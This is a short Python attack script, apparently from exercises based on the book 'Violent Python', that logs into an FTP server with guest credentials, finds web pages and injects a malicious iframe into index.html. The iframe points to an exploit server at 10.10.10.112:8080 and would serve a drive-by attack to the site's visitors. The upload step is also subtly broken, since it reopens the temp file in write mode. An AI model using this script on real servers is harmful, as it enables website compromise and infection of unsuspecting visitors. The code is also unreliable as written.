'''Page injection for chapter 2 of Violent Python'''
import ftplib


def injectPage(ipftp, ippage, ipredirect):
    ''' inject the redirect page'''
    try:
        f = open(ippage + '.tmp',  # pylint: disable=R1732
                 'w',
                 encoding='utf-8-sig')
        ipftp.retrlines('RETR ' + ippage, f.write)
        print('[+] Downloaded Page: ' + ippage)
    except:  # pylint: disable=bare-except
        print('[-] Failed to Download Page: ' + ippage)
        return
    f.write(ipredirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + ippage)
    try:
        ipftp.storlines('STOR ' + ippage, open(ippage + '.tmp',  # pylint: disable=R1732
                                               'w',
                                               encoding='utf-8-sig'))
        print('[+] Uploaded Injected Page: ' + ippage)
    except:  # pylint: disable=bare-except
        print('[-] Failed to Upload Injected Page: ' + ippage)
    return


def returnDefault(ipftp):
    ''' return the default pages for the chapter 2'''
    try:
        dirList = ipftp.nlst()
    except:  # pylint: disable=bare-except
        dirList = []
        print('[-] Could not list directory contents.')
        print('[-] Skipping To Next Target.')
        return None
    retList = []
    for fileName in dirList:
        fn = fileName.lower()
        if '.php' in fn or '.htm' in fn or '.asp' in fn or '.html' in fn:
            print('[+] Found default page: ' + fileName)
            retList.append(fileName)
    return retList


def main():
    ''' main function'''
    host = '192.168.95.179'
    userName = 'guest'
    passWord = 'guest'
    ipftp = ftplib.FTP(host)
    ipftp.login(userName, passWord)
    returnDefault(ipftp)
    injectPage(ipftp,
               'index.html',
               '<iframe src="http://10.10.10.112:8080/exploit"></iframe>')


if __name__ == '__main__':
    main()
